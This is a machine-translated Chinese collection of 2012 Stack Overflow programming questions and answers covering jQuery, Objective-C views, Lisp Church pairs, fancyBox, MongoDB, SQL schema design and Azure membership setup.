> 未捕获的类型错误：对象函数 (E,F)} 没有方法 'parseJSON' devcontrol.js:9

我的代码行 devcontrol.js 8 和 9：

```
console.log(data);
data = $.parseJSON(data); 
```

这个怎么可能。

**更新** 我现在做了一个 console.log($) evry trime bevor 他试图将字符串转换为 json 并得到

```
undefined 
```

事实证明，它是未定义的秒数。我设法发现这是因为 zfdebug 他们使用了准备好的文档，然后询问了 jquery noconfilect 这就是为什么 $ 在第二次被取消的原因

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:27:20.383

```
Uncaught TypeError: Object function (E,F)} has no method 'parseJSON' devcontrol.js:9 
```

告诉您您使用`$`变量引用的对象没有调用该方法的方法。这可能是由几件事引起的。

*   您使用的是不支持此功能的旧版本。`parseJSON`在**1.4.1 版本**中引入。更新您的版本，或使用本机`JSON.parse()`方法。
*   您的脚本链接`jQuery`错误。检查页面加载了源脚本`200 success`
*   在jquery 定义`$`变量*之后，*另一个库正在获取该变量。您可以使用 取消 jQuery 与`$`变量的关联`jQuery.noConflict()`，重新分配给另一个变量 like `$$`，或者只是使用`jQuery.parseJSON()`
*   您有脚本在页面完全加载之前运行。确保每个都在其中运行`$(document).ready(function () { /*your code here*/ });`

# php - 如何知道主机名是计算机“服务器”还是个人“桌面”

> ID：13537618
> 
> 赞同：-3
> 
> 时间：2012-11-24T02:01:45.363
> 
> 标签：php, linux, ip, hosting, detect

这是我从客户那里得到的主机名列表。

```
----------------------
msnbot-207-46-194-96.search.msn.com. <-- Server
cpe-98-151-173-209.socal.res.rr.com. <-- Desktop
msnbot-157-55-33-20.search.msn.com.  <-- Server
static.178.114.63.178.clients.your-server.de. <-- Server
---------------------- 
```

`"host IP_Address"`我通过在 linux 上使用命令来获取这些信息。是否知道主机名或 IP 地址来自个人桌面或服务器？任何类型的命令 Linux、PHP、Perl、BashCode 都可以。

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:03:26.080

嗯，不。因为*没有实际区别*，除了男性和女性之间的约定，桌面放在实际的桌面地板上，而服务器往往放在机架上。

当然，从主机名中，您以编程方式发现 Neville 或 Ginger 是否会将机器描述为服务器或色情机器的机会为零。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T02:04:28.457

据推测，您拒绝提供的服务器和台式机之间存在根本区别。因此，我会得出结论，服务器托管一个网站。因此，可以端口扫描主机名并检查端口 80（或合适的替代端口）是否打开。

# node.js - 猫鼬控制台返回未定义

> ID：13537619
> 
> 赞同：0
> 
> 时间：2012-11-24T02:01:52.947
> 
> 标签：node.js, mongodb, mongoose

我已经使用 `projectFolder$ npm install mongoose' 安装了 mongoose

我对 mongo 控制台没有任何问题，但是当我输入以下命令时

`projectFolder$ node`

`>`

`>var mongoose = require('mongoose');`

`undefined`

我启动节点服务器和 mongo 服务器没有问题，因为我可以启动我的网站没有问题。就在我在控制台中尝试上述命令时遇到了麻烦。我确认安装了猫鼬并且光标返回未定义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:52:38.833

检查项目中的 node_modules/mongoose 文件夹如果没有，请再试一次：

```
npm install mongoose 
```

编辑：我删除`var`并使用它

# objective-c - 使用objective-c自定义UIView

> ID：13537620
> 
> 赞同：1
> 
> 时间：2012-11-24T02:02:36.413
> 
> 标签：objective-c, ios, cocoa-touch, uiview

我想编写一个`UIView`执行以下操作的自定义：

*   它获取图像并将其添加到视图中。
*   它有一种翻转该图像的方法。

我想将此自定义传递`UIView`给`iCarousel`班级： [https ://github.com/nicklockwood/iCarousel](https://github.com/nicklockwood/iCarousel)

如何`UIView`使用 Objective C 和 Cocoa 创建自定义？

我开始执行以下操作：

CItem.h

```
#import <UIKit/UIKit.h>

@interface CItem : UIView
{
    UIImageView *box;
}

@property (nonatomic, retain) UIImageView * box;

@end 
```

CItem.m

```
#import "CItem.h"

@implementation CItem

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code
    }
    return self;
}

- (void)drawRect:(CGRect)rect {
    // Drawing code
    box = [[UIImageView alloc] initWithFrame:CGRectMake(0,0, 240, 240)];

    [box setImage:[UIImage imageNamed:@ "cleaning.png"]];
    [self addSubview:box];
}

@end 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T05:59:01.773

你不应该添加你的`addSubview:`in `drawRect:`。请参阅此方法的讨论：

> 讨论
> 
> 此方法的默认实现什么也不做。使用原生绘图技术（如 Core Graphics 和 UIKit）来绘制其视图内容的子类应覆盖此方法并在那里实现其绘图代码。如果您的视图以其他方式设置其内容，则无需重写此方法。例如，如果您的视图仅显示背景颜色，或者您的视图直接使用底层图层对象设置其内容，则不需要覆盖此方法。同样，如果您的视图使用 OpenGL ES 进行绘图，则不应覆盖此方法。

如果您不使用 xib 文件，您`CItem`可以将代码添加到`initWithFrame:`.

```
//CItem.h
#import <UIKit/UIKit.h>

@interface CItem : UIView

- (void)flip;

@end

// CItem.m
#import "CItem.h"

@interface CItem()

@property (assign, nonatomic) BOOL displayingPrimary;

@property (strong, nonatomic) UIImageView *primaryView;
@property (strong, nonatomic) UIImageView *secondaryView;

@end

@implementation CItem

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
        _primaryView = [[UIImageView alloc] initWithFrame:frame];
        [_primaryView setImage:[UIImage imageNamed:@ "cleaning.jpg"]];
        [self addSubview:_primaryView];

        _secondaryView = [[UIImageView alloc] initWithFrame:frame];
        [_secondaryView setImage:[UIImage imageNamed:@ "adding.jpg"]];
        [self addSubview:_secondaryView];

    }
    return self;
}

- (void)flip
{
    [UIView transitionFromView:(self.displayingPrimary ? self.primaryView : self.secondaryView)
                        toView:(self.displayingPrimary ? self.secondaryView : self.primaryView)
                      duration:1.0
                       options:(self.displayingPrimary ? UIViewAnimationOptionTransitionFlipFromRight :
                                UIViewAnimationOptionTransitionFlipFromLeft) | UIViewAnimationOptionShowHideTransitionViews
                    completion:^(BOOL finished) {
                        if (finished) {
                            self.displayingPrimary = !self.displayingPrimary;
                        }
                    }];
}

@end 
```

然后你可以`CItem`像这样使用：

```
CItem *subView = [[CItem alloc] initWithFrame:CGRectMake(0, 0, 320, 400)];
[self.view addSubview:subView]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T02:11:39.290

如果您打算进行自定义绘图，则应仅实现 drawRect。如果你想使用子视图，你可以将你的代码移动到 initWithFrame 中：

```
- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
       box = [[UIImageView alloc] initWithFrame:CGRectMake(0.0f, 0.0f, 240.0f, 240.0f)];
       [box setImage:[UIImage imageNamed:@"cleaning"]];
       [self addSubview:box];
    }
    return self;
} 
```

您可以安全地删除 drawRect 方法。不确定“翻转”图像是什么意思，但您应该能够使用自定义类的“box”属性来操作 imageView 对象。

# javascript - javascript 访问特定的 css 选择器属性

> ID：13537621
> 
> 赞同：2
> 
> 时间：2012-11-24T02:02:45.770
> 
> 标签：javascript, css

我在一个 css 文件中有这个

```
.datagrid table tbody td { color: #00496B; border-left: 1px solid
    #E1EEF4; font-size: 16px ;font-weight: normal; } 
```

如何使用 javascript 动态更改字体大小？以下代码适用于所有 td，但如何访问 .datagrid 下的特定 td？任何帮助表示赞赏。

```
css('td', 'font-size', '9px');
function css(selector, property, value) {
      for (var i=0; i<document.styleSheets.length;i++) {//Loop through all styles
          //Try add rule
          try { document.styleSheets[i].insertRule(selector+ ' {'+property+':'+value+'}', document.styleSheets[i].cssRules.length);
          } catch(err) {try { document.styleSheets[i].addRule(selector, property+':'+value);} catch(err) {}}//IE
      }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:26:50.373

如果元素具有唯一 ID，则可以使用它来选择元素，而不是遍历 CSS，`document.getElementById`否则可以使用`getElementByTagName`如下：

```
document.getElementsByTagName('div')[0] //the first div in the document
document.getElementsByTagName('div')[1] //the second div... etc... 
```

然后你可以改变内联css，例如`<div id="mydiv" style="width: 200px;">`

```
document.getElementById('mydiv').style.width = "200px" 
```

否则，如果您不想插入内联样式，则可以使用 访问外部 CSS `document.styleSheets[index]`，如果您有多个样式表，则使用 index ，否则只需使用`document.styleSheets[0]`，则规则位于另一个数组中，`cssRules[index]`例如与`document.styleSheets[0].cssRules[0]`您选择第一个外部 CSS 的第一个规则。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T02:39:16.710

映射 css 规则的最简单方法是使用 querySelectorAll：

```
document.querySelectorAll(".datagrid table tbody td") 
```

所有最近的浏览器都支持这一点。

如果您针对单个元素：

```
document.querySelector(".datagrid table tbody td") 
```

并修改此特定元素的字体大小：

```
document.querySelector(".datagrid table tbody td").style.fontSize="12px"; 
```

# lisp - Lambda Calculus CONS Pair 与 Lisp 的实现

> ID：13537622
> 
> 赞同：1
> 
> 时间：2012-11-24T02:03:05.493
> 
> 标签：lisp, lambda-calculus

我正在尝试实现 Church Pair Lambda Calc。使用 CLisp 的样式。

根据维基百科：

> ```
> pair ≡ λx.λy.λz.z x y 
> ```

到目前为止，这是我的代码：

```
 (defvar PAIR
         #'(lambda(x)
                 #'(lambda(y)
                         #'(lambda(z)
                                 (funcall (funcall z x) y)))) ) 
```

这些是我的第一个和第二个功能：

```
(defvar FIRST
        #'(lambda(p)
                (funcall(p TRUE)))
)

(defvar SECOND
        #'(lambda(p)
                (funcall(p FALSE)))
) 
```

这 2 个函数从 Int 转换为 ChurchNumber

```
(defun church2int(numchurch)
    (funcall (funcall numchurch #'(lambda (x) (+ x 1))) 0)
)

(defun int2church(n)
    (cond
        ((= n 0) #'(lambda(f) #'(lambda(x)x)))
        (t #'(lambda(f) #'(lambda(x) (funcall f
            (funcall(funcall(int2church (- n 1))f)x))))))

) 
```

所以，我要做的是：

```
(setq six (int2church 6))
(setq four (int2church 4)) 
```

进而：

```
(setq P (funcall (funcall PAIR six) four)) 
```

我有：

```
#<FUNCTION :LAMBDA (Y) (FUNCALL (FUNCALL F X) Y)> 
```

所以如果我这样做：

```
(funcall #'FIRST P) 
```

我有这个错误：

```
*** - FIRST: #<FUNCTION :LAMBDA (Y) (FUNCALL (FUNCALL F X) Y)> is not a list 
```

我看不出我做错了什么。任何帮助，将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:22:30.763

1.  你正在使用`#'FIRST`.
    这意味着它使用的是*函数*FIRST，而不是您定义的变量。`FIRST`（来自标准库）是 的另一个名称`car`，即它返回列表的第一个元素（因此错误抱怨`P`不是列表）。
    修复：`(funcall FIRST P)`
    这将导致错误`*** - EVAL: undefined function P`

2.  这是由您的定义引起的`FIRST`：`#'(lambda (p) (funcall (p TRUE)))`
    这意味着：返回一个带有单个参数的 lambda 函数`p`。该参数被忽略。相反，调用将变量的值作为参数`p`传递的全局函数： . 然后调用as (another) function:的结果。 修复： 这将导致错误`TRUE``(p TRUE)``p``(funcall ...)`
    `#'(lambda (p) (funcall p TRUE))`
    `*** - :LAMBDA: variable TRUE has no value`

3.  那是因为你还没有真正定义`TRUE`过`FALSE`。
    修复：定义`TRUE`和`FALSE`。

# queue - 队列自动机可以模拟任何下推自动机吗？

> ID：13537623
> 
> 赞同：1
> 
> 时间：2012-11-24T02:03:09.097
> 
> 标签：queue, theory, state-machine, pushdown-automaton

我正在做一个理论作业，这个问题真的让我思考。问题是：证明任何下推自动机都可以由队列自动机模拟。现在，最初我认为这很简单，但后来我想到了 L = {WW^R | W = {a, b}*} （W^R 是 W 的倒数）这很容易以下推自动机的一般形式创建，但我想不出任何方法以一般形式队列自动机。我不认为我们可以为此设计一个（有限的）一般情况。我可能也想多了，因为我可能只是误解了模拟的含义。无论如何，我比问题更可能是错误的，但是对于我提到的情况，它是如何工作的？

感谢您提供的任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-06T03:28:18.770

有一个非常简单的技巧：

1）证明一个队列[可以模拟一个完整的图灵机](https://en.wikipedia.org/wiki/Queue_automaton#Turing_completeness)。简而言之，将图灵磁带放在队列上，用特殊标记缠绕在磁带的末端以及读取头上。（如果从那里不清楚，请查看 wiki 链接或发表评论）

2) 请注意，图灵机严格来说比 PDA 更强大，因此它必须能够模拟 PDA。

# php - PHP Javascript / AJAX 表单

> ID：13537628
> 
> 赞同：-1
> 
> 时间：2012-11-24T02:04:08.020
> 
> 标签：php, javascript, sql, ajax

我正在尝试编写一个“流”，用户可以在其中输入有关自己的状态。

我已经完成了这项工作，但我希望您不必重新加载页面即可查看您的新状态。

我知道你需要使用 Ajax 来做这样的事情，但问题是我对 Javascript 和 Ajax 一无所知。

我的代码是：

```
if(isset($_POST['send-stream'])){
    dbquery("INSERT INTO friend_stream (userid,type,timestamp,status) VALUES ('".USER_ID."','1',current_timestamp(),'".clean($_POST['status'])."')");
    header("Location: ".WWW."/me");

<div class="new-stream">
    <form method="post">
        <input type="text" name="status" value="What's Up?" maxlength="150" onclick="this.value='';" />
        <input type="submit" name="send-stream" value="Share" />
    </form>
</div> 
```

当他们提交他们的状态时，我也希望 div (#friend-stream) 也自动更新。

任何知道如何实现这一目标的人将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:27:43.727

我认为最好的方法是开始阅读有关 ajax 和 JS 的内容。

[http://www.w3schools.com/ajax/](http://www.w3schools.com/ajax/)

[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

如果你会使用 jQuery，你会做这样的事情

```
$('#submitStatusButton').click(function(){
   var status = $('#statusId').val();
   if (.. something to validate that status is valid and not the same){
      $.ajax({
          type: "POST",
          url: "yourFileForUpdating.php",
          data: {
             status: status,
             // may be some other params
          }
      }).done(function( msg ) {
          // update your status
      });
   }
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T02:30:15.367

除了 AJAX，如果你想实时进行，我建议使用 WebSockets。 [http://en.wikipedia.org/wiki/WebSocket](http://en.wikipedia.org/wiki/WebSocket)

# c# - C# 对象池缺陷 - 所有索引都相同？

> ID：13537634
> 
> 赞同：1
> 
> 时间：2012-11-24T02:06:41.440
> 
> 标签：c#, object, memory, reference

很久以前我写了一个对象池系统（嗯，大部分是我当时需要的部分）。现在程序已经在它上面进化了，我发现了一个我认为我在实现池时没有的缺陷。

本质上，池将一个对象作为构造函数，并使用反射克隆它以创建该对象的数组。这是在池中创建对象的函数的实现：

```
 poolSize i = 0;
        T[] oldData = null;

        if (this.chunks != null && this.chunks.Length > 0)
        {
            oldData = new T[this.depth];
            Array.Copy(this.chunks, oldData, this.chunks.Length);
        }

        this.chunks = new T[this.depth + this.depthIncrement];

        if (oldData != null)
        {
            Array.Copy(oldData, this.chunks, oldData.Length);
        }

        for (i = this.depth; i < this.depth + this.depthIncrement; i++)
        {

            this.chunks[i] = Cloner.CloneObjectWithIL(this._template);
            this.freeQueue.Add(i);
        }

        this.depth += this.depthIncrement; 
```

现在，检查 Object.ReferenceEquals(pool.chunks[0], pool.chunks[1]) 返回 false - 所以看起来数组的每个索引都是它自己的对象，而不仅仅是对一个对象的一堆引用。

现在在主代码中，我们使用 GetObject 方法从池中获取一个对象：

```
 public T GetObject(T tmp)
    {
        T retObj = tmp;

        this.chunks[this.volume] = retObj;
        this.usedQueue.Add(this.volume);
        this.volume++;

        return retObj;
    } 
```

我遇到了一些受保护的内存错误（C# 相当于 SEGFAULT？）所以我继续进行一些调试。所以我使用了我通常不会做的代码，因为它违背了池背后的一些目的：

```
Map.Entity tmp = Map.Entity.EntityPool.chunks[0];
tmp.SetPosition(m, 1, 9); 
```

现在，当我在那之后添加一个断点并查看块数组时，块数组的每个元素的位置都是 (1, 9)，而除了索引 0 之外，它们都应该是 (0, 0)。

我在这里想念什么？

# objective-c - 文本字段 Datepicker 计算

> ID：13537635
> 
> 赞同：2
> 
> 时间：2012-11-24T02:06:48.340
> 
> 标签：objective-c, ios

我想用 Xcode 计算这个操作：

A*B*(天)=R

DAYS=从过去的日期选择器到今天有多少天。

今天是 iPhone 的日期设置。例如：

5*5*10

10=昨天和今天之间的天数。

这是我的情况：

我的 H @interface ViewController ： UIViewController

```
@property (strong, nonatomic) IBOutlet UITextField *a;
@property (strong, nonatomic) IBOutlet UITextField *b;
@property (strong, nonatomic) IBOutlet UILabel *r;

@property (strong, nonatomic) IBOutlet UIButton *result;

@property (strong, nonatomic) IBOutlet UIDatePicker *data;

@end 
```

我的

```
- (IBAction)calculate:(id)sender {
    NSDate *past = _data.date ;
    NSDate *now =[NSString stringWithFormat:@"%@",nil];

    **float z = HOW MANY DAYS BETWEEN PICKER AND TODAY;** //this is a example

    float a = ([a.text floatValue]);
    float b = a*([b.text floatValue]);
    float r=  a*b*(z.text float);

    _result.text = [[NSString alloc]initWithFormat:@"%2.f",b];

} 
```

我知道这是错误的方法....你能帮帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T04:44:29.103

您正在计算天数，因此您可以使用`int`而不是`float`.

```
NSDate *past = _data.date ;
NSDate *now = [NSDate date];

NSCalendar *gregorianCalendar = [[NSCalendar alloc]
                 initWithCalendarIdentifier:NSGregorianCalendar];
NSUInteger unitFlags = NSDayCalendarUnit;
NSDateComponents *components = [gregorianCalendar components:unitFlags
                                            fromDate:past
                                              toDate:now
                                             options:0];
z = [components day];

int a = a.text.intValue;
int b = a * b.text.intValue;
int r = a * b * z;
_result.text = [[NSString alloc] initWithFormat:@"%d", r]; 
```

# jquery - 如何使用砖石启用无限滚动？

> ID：13537638
> 
> 赞同：1
> 
> 时间：2012-11-24T02:07:27.030
> 
> 标签：jquery, css, jquery-masonry, infinite-scroll, fluid-layout

那么如何在我的砌体流体布局中添加或集成无限滚动？我已经用谷歌搜索但不明白。这是我到目前为止得到的：

```
/**
 * Base js functions
 */

$(document).ready(function(){
    var $container = $('.container');

    var gutter = 20;
    var min_width = 270;
    $container.imagesLoaded( function(){
        $container.masonry({
            itemSelector : '.box',
            gutterWidth: gutter,
            isAnimated: true,
              columnWidth: function( containerWidth ) {
                var box_width = (((containerWidth - 2*gutter)/3) | 0) ;

                if (box_width < min_width) {
                    box_width = (((containerWidth - gutter)/2) | 0);
                }

                if (box_width < min_width) {
                    box_width = containerWidth;
                }

                $('.box').width(box_width);

                return box_width;
              }
        });
    });
}); 
```

有人可以帮忙吗？太感谢了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T06:24:01.747

如果您在[masonry 网站](http://masonry.desandro.com/demos/infinite-scroll.html)上查看无限滚动示例的源代码，您可以看到在初始 Masonry 设置后完成所有工作的函数。在 $container.imagesLoaded 函数之后，添加 Infinite Scroll 配置，然后在回调函数中触发 Masonry。此外，请务必在 jquery.masonry.min.js 之后包含 jquery.infinitescroll.min.js。

这是该页面的 JS：

```
$(function(){

var $container = $('#container');

$container.imagesLoaded(function(){
  $container.masonry({
    itemSelector: '.box',
    columnWidth: 100
  });
});

// Infinite Scroll
$container.infinitescroll({
  navSelector  : '#page-nav',    // selector for the paged navigation 
  nextSelector : '#page-nav a',  // selector for the NEXT link (to page 2)
  itemSelector : '.box',     // selector for all items you'll retrieve
  loading: {
      finishedMsg: 'No more pages to load.',
      img: 'http://i.imgur.com/6RMhx.gif'
    }
  },
  // trigger Masonry as a callback
  function( newElements ) {
    // hide new items while they are loading
    var $newElems = $( newElements ).css({ opacity: 0 });
    // ensure that images load before adding to masonry layout
    $newElems.imagesLoaded(function(){
      // show elems now they're ready
      $newElems.animate({ opacity: 1 });
      $container.masonry( 'appended', $newElems, true ); 
    });
  }
); 
```

});

# ios - ios - 向我的应用程序添加 Podcast 提要

> ID：13537642
> 
> 赞同：1
> 
> 时间：2012-11-24T02:08:48.293
> 
> 标签：ios, uitableview, xml-parsing, rss, podcast

在我的应用程序中，我想在 UITableView 中列出我的提要和它的剧集，以便用户可以收听它。它只是一个提要，因此不会复制 Podcast 应用程序或任何东西。

添加提要（我正在使用 jellycast.com）是否就像使用 XML 解析器添加常规 RSS 提要一样，还是我需要其他东西才能使其工作。我知道我需要实现一个媒体播放器，但现在这是后面的步骤。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:13:39.990

是的，播客提要应该是 RSS。我用它来解析 RSS：

[https://github.com/kballard/feedparser](https://github.com/kballard/feedparser)

当有人为您完成所有代码时，为什么还要编写任何代码？:)

媒体播放器也非常简单；iOS 为您提供了 MPMoviePlayerController，当您将 URL 交给它时，它会完成所有繁重的工作。

# c# - Windows 8 商店应用程序 C++ 文件访问

> ID：13537645
> 
> 赞同：2
> 
> 时间：2012-11-24T02:10:00.263
> 
> 标签：c#, c++, file-io, windows-8

我正在开发一个 Windows 8 商店应用程序，该应用程序将 C# 用于 GUI 和 C++（作为同一解决方案中的另一个项目，设置为制作 DLL）进行图像处理，并试图`.png`从指定的路径在 C++ 中打开图像来自 C#。当图像位于Apps资产文件夹中时，这工作正常，`.\\Assets\\image.png`但当我尝试访问图片库中的图像时，我得到`E_ACCESSDENIED`了C++代码。我已经在 c# 项目清单中指定了文档和图片库功能，但 C++ 仍然被拒绝访问。任何人都知道如何授予对某些文件夹的 C++ 代码访问权限？

例如调用 wincodec.h 中定义的函数，如果 'filename' 类似于 "C:\Users\Name\Pictures\image0.png" hr 将得到结果`E_ACCESSDENIED`

```
if (SUCCEEDED(hr))
{
    hr = pFactory->CreateDecoderFromFilename(
        filename,
        NULL,
        GENERIC_READ,
        WICDecodeMetadataCacheOnDemand,
        &pDecoder);

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T22:35:13.970

> 当我尝试访问图片库中的图像时，我得到 E_ACCESSDENIED

是的，这是一个特点。您需要在应用程序的清单中声明 imagesLibrary 功能以允许访问图片库。

有关更多详细信息，请参阅[此帖子](http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/a928712c-576a-4c65-b06b-6db493e3b8d9?prof=required)。

# jquery - 自动打开fancyBox？

> ID：13537647
> 
> 赞同：3
> 
> 时间：2012-11-24T02:10:12.940
> 
> 标签：jquery, fancybox

我目前正在努力让fancyBox jQuery 插件在我的网站首页加载后自动打开。我对 Javascript 和 jQuery 非常陌生，需要一些指针。

我的 HEAD 标签之间有以下代码。只是想知道我是否可以在此处插入其他内容，以便在页面加载时打开fancyBox。

```
<script type="text/javascript">
        $(document).ready(function() {
            $(".fancybox").fancybox();
        });
</script> 
```

我在 fancyBox 文档中找到了以下 API 方法，但不确定这是否是我正在寻找的。我似乎无法让它工作。

```
$.fancybox.open( [group], [options] ) 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-24T02:26:52.617

设置成这样...

```
<a id="my-custom-trigger" class="gallery" href="http://moviebuzzers.com/wp-content/uploads/2012/08/paranorman-still.jpg">  
    <img src="http://moviebuzzers.com/wp-content/uploads/2012/08/paranorman-still.jpg" height="100"/>
</a>​ 
```

ID 为“my-custom-trigger”的锚点是触发器 -> 如果单击它，fancybox 会弹出。所以你需要在页面自动加载后“点击”它......

```
// Use document ready event, or window load,
// whichever one suits you the best...
$(window).load(function(){
    // Simulate click on trigger element
    $('#my-custom-trigger').trigger('click');
}); 
```

现在，你完成了！

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-24T02:45:34.587

如果您使用的是 fancybox 2，那么您有两种选择，一种是`triggering another element`您在接受的答案`manually trigger`中看到的，另一种是在

[http://jsfiddle.net/STgGM/](http://jsfiddle.net/STgGM/)

如[http://fancyapps.com/fancybox/#examples](http://fancyapps.com/fancybox/#examples)所述（在页面加载部分启动fancyBox）只需将onload更改为您想要的任何内容

简单的用法；

```
 $.fancybox.open(['#container_div1','#container_div1']); 
```

另外你可以试试这个；

```
 <script  type="text/javascript">
        $(document).ready(function () {
            $.fancybox({
                'href': '#my_div'
            });
        });
    </script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-20T15:57:15.947

```
$(document).ready(function() {
    $('#popup_box').fancybox().trigger('click'); 
}); 
```

[资源](http://codepotato.co.uk/2010/10/opening-jquery-fancybox-on-page-load/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-10T06:11:52.753

使用版本 2.1.5 测试

```
$(window).load(function(){
    $.fancybox.open('image.jpg');
}); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-05-30T06:34:13.150

```
$.fancybox(
{
'title':'Title',
'overlayColor': '#000',
'href' :'index.html',
'overlayOpacity': 0.7                
}
); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2020-04-28T13:36:06.340

```
$(window).load(function(){
    // Simulate click on trigger element
    fancy =  $(".fancybox").fancybox();
    $.fancybox.open( fancy )
}); 
```

# c# - SQL 关系用于一些独特的需求

> ID：13537650
> 
> 赞同：0
> 
> 时间：2012-11-24T02:10:43.337
> 
> 标签：c#, .net, sql, orm

我一直坚持解决我将在下面描述的问题。如果有什么需要澄清的，请告诉我，以便我更新我的帖子。首先，让我解释一下数据库结构。我有以下表格（以及更多表格，但它们不属于本主题）：

1) 部门 2) 公司 3) 部门 4) 产品

上述所有表格都是相关的。

1）Divisions有很多Company，但Company只能属于一个Division。1-* 2) 每个公司可以有一个或多个部门，但一个部门可以属于一个公司。1-* 3) 每个部门可以有一个或多个产品，每个产品可以属于一个或多个部门。*-*

我的问题如下：鉴于上述情况，无论公司如何，我都需要生成或检索给定部门下的所有部门。但诀窍是他们需要根据他们的名字而不是 id 合并，所以假设你有 Division 1，在它之下是 Company A 和在那个 Sector A 之下。当然，Sector A 可以作为另一家公司的另一个实体再次存在，以相同的名称，但不同的 ID（A 公司除外）也属于第 1 类。因此，在那个新的“合并”中，A 部门应该是不同的意思，应该有一个实体，而不是更多。让我们将存储这些合并的表称为表 X。现在表 X（包含给定部门下的唯一部门，无论其或其各自的公司）应该映射到另一个表（表 Y），该表将包含文档和其他文件。

如何将上述内容转换为 SQL 表/视图或任何需要的内容？如果这不可能，解决问题的正确方法是什么？另外，如果扇区被删除会怎样？或者它的名字被更新了？还是产品更新/删除？在这种特殊情况下，最好的做法是什么。

注意：上面列出的表 1、2、3、4 已经创建并且可以使用。但是我需要添加上述问题所描述的额外功能。我不能在这里做任何事情来改变逻辑和要求。

使用 MS SQL Server 2008 R2。

提前谢谢了。如果有任何需要澄清的地方，请告诉我。

# 编辑：当前结构如何与添加文档时应该如何生成。

![在此处输入图像描述](../Images/b645dfacafb85149eb70c232a08079a6.png)

# 预期输出：

![在此处输入图像描述](../Images/459e3aa924f151beebbf9731e093dc49.png)

此处的合并仅基于产品名称。但是现在，如果产品 A 已经更新，会发生什么？删除？这如何反映在输出和映射文档上？

再次感谢。

（顺便说一句：考虑到第一个数据模型（第一张图像），我可以生成该输出，但我需要以某种方式将其放置在一个适当关系的表中，以便我可以根据上述所有内容将文档映射到产品。）

# mongodb - 我可以停止从 Reduce 功能发射吗？

> ID：13537652
> 
> 赞同：0
> 
> 时间：2012-11-24T02:11:17.917
> 
> 标签：mongodb, mapreduce

我正在为 MongoDB 编写 MapReduce 代码（显然是在 Javascript 中）。在reduce代码中，看起来我必须总是返回一些值（与发射相同）？我找不到不这样做的方法，但如果我可以停止在 reduce 函数中发出记录，我的代码可以更简单，所以我想知道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:59:00.210

我相信发射是完全可选的（顺便说一句，在你的地图中“返回”一个值不应该做任何事情）。只是不要在你的映射函数内部发出，结果不会进入减少函数

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T22:59:36.143

我试图了解你来自哪里。

MR 的基础是 Map Reduce。如果您的 MR 没有 reduce 功能，则没有输出。因此，总是需要一个 reduce 函数。

确实，如果您从 map 函数中发出一行，那么 reduce 不需要运行。然而，要让 MR 完全运行，它必须调用 reduce 函数，否则没有输出，这会使 MR 毫无意义。

> 在reduce代码中，看起来我必须总是返回一些值（与发射相同）？

是的，这是因为 MR 在数学上是如何工作的：[http](http://www.mongodb.org/display/DOCS/MapReduce#MapReduce-Amoretechnicalexplanation) ://www.mongodb.org/display/DOCS/MapReduce#MapReduce-Amoretechnicalexplanation你可以在那里看到它的基本解释。MongoDB 期望像这样运行它，因为它只支持这种方法。

# sql - 获得简单的会员资格以使用 azure 网站

> ID：13537656
> 
> 赞同：6
> 
> 时间：2012-11-24T02:11:41.083
> 
> 标签：sql, asp.net-mvc, azure, azure-sql-database, simplemembership

我想使用简单的成员资格提供程序，就好像我正在连接到这个 mvc 项目的本地 mdf 文件一样，除了我想要免费的 azure 试用数据库上的成员表

```
UserProfile
webpages_membership
webpages_OAuthMembership
webpages_Roles
webpages_UsersInRoles 
```

连接字符串应该如何寻找建立这个连接。

当本地连接到本地 mdf 时，它的工作方式就像猫屁股，但是没有很好地记录在 azure 上构建的表。

有人做过吗？

好的，我需要确保 conn 字符串名称与传递给 Filters > InitializeSimpleMembershipAttribute.cs 文件的 WebSecurity.InitializeDatabaseConnection 方法的名称相同，默认情况下它是 DefaultConnection，因此它必须与您提供的连接字符串对齐azure db conn 字符串。

所以现在我已经从 VS 中删除了 f5 并创建了表格，我什至在本地测试了我的 facebook 登录并且它可以工作。

但是...当我将应用程序部署到 azure 网站时，该站点超时并出现 504 错误，例如无法连接到 sql，这发生在我的 Azure 中的 sql 数据库以及我启动虚拟安装了 sql 并启用了 tcp 端口 1433 的服务器 - 就像我说这在我用完 VS 时在本地工作，只是在天蓝色云上没有。

我得到错误。

处理您的请求时发生错误。

fiddler 将其显示为 504 错误网关超时。有人使用简单的登录会员 api 在 Azure 上运行 mvc 4 站点吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T15:54:26.467

